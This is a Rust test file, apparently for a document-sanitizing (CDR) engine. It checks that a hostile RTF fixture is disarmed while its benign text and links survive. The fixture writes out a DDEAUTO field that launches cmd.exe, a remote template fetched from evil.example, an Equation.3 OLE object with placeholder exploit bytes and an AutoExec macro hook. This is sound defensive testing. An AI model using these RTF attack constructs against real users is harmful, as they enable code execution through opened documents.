//! RTF 재조합

mod common;

use cdr::{CdrResult, Engine, Status};

fn cats(r: &CdrResult) -> Vec<String> {
    r.findings.iter().map(|f| f.category.clone()).collect()
}

fn contains(hay: &[u8], needle: &[u8]) -> bool {
    hay.windows(needle.len()).any(|w| w == needle)
}

fn hex(data: &[u8]) -> String {
    data.iter().map(|b| format!("{b:02x}")).collect()
}

fn malicious_rtf() -> Vec<u8> {
    let png = common::png_with_payload();
    format!(
        r##"{{\rtf1\ansi\deff0{{\fonttbl{{\f0 Arial;}}}}
{{\*\template http://evil.example/t.dotm}}
{{\*\datastore 0105000002000000180000004d73786d6c322e534158584d4c}}
{{\info{{\author attacker}}{{\company evil}}}}
\pard 안전한 본문\par
{{\object\objemb\objupdate{{\*\objclass Equation.3}}{{\*\objdata 01050000020000000b0000004571756174696f6e2e3300 EXPLOITBYTES}}{{\result{{\pict\wmetafile8\picw10\pich10 0100090000}}}}}}\par
{{\field{{\*\fldinst DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"}}{{\fldrslt 결과표시}}}}\par
{{\field{{\*\fldinst HYPERLINK "https://example.com/"}}{{\fldrslt 정상링크}}}}\par
{{\field{{\*\fldinst HYPERLINK "#bookmark"}}{{\fldrslt 문서안}}}}\par
{{\*\shppict{{\pict\pngblip\picw8\pich8 {png}}}}}{{\nonshppict{{\pict\wmetafile8 0100}}}}\par
{{\*\formfield{{\*\ffname t1}}{{\*\ffentrymcr AutoExec}}}}
{{\*\unknownthing\bin5 MZ\x90\x00x}}
\verylongcontrolwordthatexceedsthirtytwocharacters1 \fs99999999999 끝\par
}}"##,
        png = hex(&png)
    )
    .into_bytes()
}

#[test]
fn rtf_active_content_is_removed() {
    let r = Engine::default().process(&malicious_rtf(), "문서.rtf");
    assert_eq!(
        r.status,
        Status::Sanitized,
        "{} {:#?}",
        r.reason,
        r.findings
    );
    let c = cats(&r);
    for want in [
        "embedded-object",
        "dde",
        "hidden-data",
        "metadata",
        "image",
        "structure",
    ] {
        assert!(c.iter().any(|x| x == want), "{want}: {c:?}");
    }
    let out = r.output.as_ref().unwrap();
    for gone in [
        &b"objdata"[..],
        b"EXPLOITBYTES",
        b"Equation.3",
        b"evil.example",
        b"datastore",
        b"attacker",
        b"DDEAUTO",
        b"wmetafile",
        b"AutoExec",
        b"<?php",
        b"verylongcontrolword",
        b"99999999999",
    ] {
        assert!(!contains(out, gone), "{}", String::from_utf8_lossy(gone));
    }
    for kept in [
        "안전한 본문",
        "결과표시",
        "정상링크",
        "https://example.com/",
        "#bookmark",
        "끝",
    ] {
        assert!(contains(out, kept.as_bytes()), "{kept}");
    }
    assert!(contains(out, b"\\pngblip"));

    // 다시 넣으면 더 제거할 것이 없다
    let again = Engine::default().process(out, "문서.rtf");
    assert_eq!(again.status, Status::Clean, "{:#?}", again.findings);
}

#[test]
fn rtf_structure_limits() {
    // 과도한 중첩은 차단
    let mut deep = b"{\\rtf1 ".to_vec();
    deep.extend(std::iter::repeat_n(b'{', 2000));
    deep.extend(std::iter::repeat_n(b'}', 2001));
    assert_eq!(
        Engine::default().process(&deep, "a.rtf").status,
        Status::Blocked
    );

    // .doc 로 위장한 RTF 는 RTF 로 재조합
    let r = Engine::default().process(b"{\\rtf1\\ansi hello\\par}", "invoice.doc");
    assert_eq!(r.detected_type, "rtf");
    assert_eq!(r.output_filename.as_deref(), Some("invoice.rtf"));
    assert!(cats(&r).iter().any(|c| c == "type-mismatch"));
}
